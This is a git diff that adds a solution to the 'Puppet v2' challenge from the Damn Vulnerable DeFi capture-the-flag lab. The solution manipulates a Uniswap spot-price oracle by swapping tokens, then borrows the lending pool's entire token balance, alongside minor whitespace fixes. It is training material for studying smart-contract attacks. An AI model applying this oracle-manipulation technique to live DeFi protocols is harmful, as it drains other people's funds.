@@ -16,7 +16,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         await ethers.provider.send("hardhat_setBalance", [
@@ -28,7 +28,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();
@@ -38,7 +38,7 @@ describe('[Challenge] Puppet v2', function () {
         this.uniswapRouter = await UniswapRouterFactory.deploy(
             this.uniswapFactory.address,
             this.weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await this.token.approve(
@@ -82,6 +82,30 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackRouter02 = this.uniswapRouter.connect(attacker)
+        const attackPuppetV2 = this.lendingPool.connect(attacker)
+        const attackWeth = this.weth.connect(attacker)
+        const attackToken = this.token.connect(attacker)
+
+        //swap our DVT for WETH, and devalue DVT
+        await attackToken.approve(attackRouter02.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await attackRouter02.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            10 ** 10
+        )
+        //get how many WETH reqquired to borrow all the token
+        const WETHRequired = await attackPuppetV2.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        //swap our eth for weth, keep some for next ransaction
+        attackWeth.deposit({ value: ethers.utils.parseEther("19.9") })
+
+        //empty the lending pool
+        await attackWeth.approve(attackPuppetV2.address, WETHRequired)
+        await attackPuppetV2.borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
